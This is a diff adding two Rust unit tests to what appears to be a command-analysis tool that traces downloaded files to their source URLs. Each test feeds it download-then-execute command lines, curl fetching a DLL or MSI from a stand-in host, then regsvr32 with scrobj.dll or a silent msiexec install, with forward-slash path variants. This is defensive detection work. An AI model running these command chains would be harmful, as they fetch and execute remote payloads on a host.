@@ -15758,6 +15758,29 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
     }
 
     #[test]
+    fn regsvr32_slash_equivalent_load_target_resolves_full_path_download_source() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::interp::interpret_line(
+            r#"curl -o C:\Temp\stage.dll https://regsvr32-slash-equivalent.example/stage.dll"#,
+            &mut env,
+        );
+        crate::interp::interpret_line("regsvr32 /s /i:C:/Temp/stage.dll scrobj.dll", &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "regsvr32 /s /i:C:/Temp/stage.dll scrobj.dll"
+                        && url == "https://regsvr32-slash-equivalent.example/stage.dll"
+            )
+        });
+        assert!(
+            has,
+            "regsvr32 slash-equivalent load target did not resolve full-path download source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn msiexec_url_package_argument_emits_typed_trait() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "https://msiexec-package.example/setup.msi";
@@ -16025,6 +16048,29 @@ $stageUrl = "ps-schemeless.example/stage.zip""#,
                         && url == "https://msiexec-current-dir.example/setup.msi"
             )),
             "current-dir msiexec package did not resolve tracked source: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn msiexec_slash_equivalent_package_resolves_full_path_download_source() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::interp::interpret_line(
+            r#"curl -o C:\Temp\setup.msi https://msiexec-slash-equivalent.example/setup.msi"#,
+            &mut env,
+        );
+        crate::interp::interpret_line("msiexec /i C:/Temp/setup.msi /qn", &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "msiexec /i C:/Temp/setup.msi /qn"
+                        && url == "https://msiexec-slash-equivalent.example/setup.msi"
+            )
+        });
+        assert!(
+            has,
+            "msiexec slash-equivalent package did not resolve full-path download source: {:?}",
             env.traits
         );
     }
